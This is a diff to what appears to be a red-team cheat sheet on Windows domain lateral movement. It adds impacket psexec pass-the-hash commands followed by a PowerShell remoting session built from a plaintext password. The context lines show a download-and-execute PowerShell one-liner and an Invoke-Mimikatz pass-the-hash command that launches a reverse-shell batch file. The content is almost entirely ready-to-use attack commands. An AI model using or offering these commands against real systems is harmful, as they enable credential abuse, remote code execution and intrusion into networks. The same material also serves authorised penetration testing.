@@ -165,6 +165,17 @@ $Contents = 'powershell.exe -c iex ((New-Object Net.WebClient).DownloadString(''
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH> /run:C:\reverse.bat"'
 ```
 
+#### Psexec then pssession
+- https://github.com/maaaaz/impacket-examples-windows
+```
+.\psexec_imp.exe <DOMAIN>/<USER>@<TARGET FQDN> -hashes :<NTLM HASH>
+powershell.exe
+$password = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $password)
+$sess = new-pssession -credential $creds -computername <TARGET FQDN>
+enter-pssession $sess
+```
+
 ## Check Local Admin Access
 #### Crackmapexec
 ```
